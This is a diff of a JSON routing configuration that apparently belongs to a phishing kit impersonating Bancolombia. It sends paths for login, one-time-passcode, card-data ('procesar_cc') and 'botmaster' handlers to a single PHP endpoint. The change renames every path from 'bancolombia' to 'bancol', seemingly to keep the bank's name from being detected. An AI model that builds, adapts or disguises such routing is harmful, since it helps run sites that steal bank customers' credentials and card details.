@@ -91,43 +91,43 @@
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/dina-verifi.php",
+      "source": "/dinadatos/bancol/dina-verifi.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/dinacol.php",
+      "source": "/dinadatos/bancol/dinacol.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/botmaster2.php",
+      "source": "/dinadatos/bancol/botmaster2.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/verifidata.php",
+      "source": "/dinadatos/bancol/verifidata.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/index.php",
+      "source": "/dinadatos/bancol/index.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/modules/login/process_login.php",
+      "source": "/dinadatos/bancol/modules/login/process_login.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/modules/api/process_otp.php",
+      "source": "/dinadatos/bancol/modules/api/process_otp.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/modules/api/procesar_cc.php",
+      "source": "/dinadatos/bancol/modules/api/procesar_cc.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/modules/api/verificar_estado.php",
+      "source": "/dinadatos/bancol/modules/api/verificar_estado.php",
       "destination": "/api/index.php"
     },
     {
-      "source": "/dinadatos/bancolombia/modules/api/actualizar_estado.php",
+      "source": "/dinadatos/bancol/modules/api/actualizar_estado.php",
       "destination": "/api/index.php"
     }
   ]
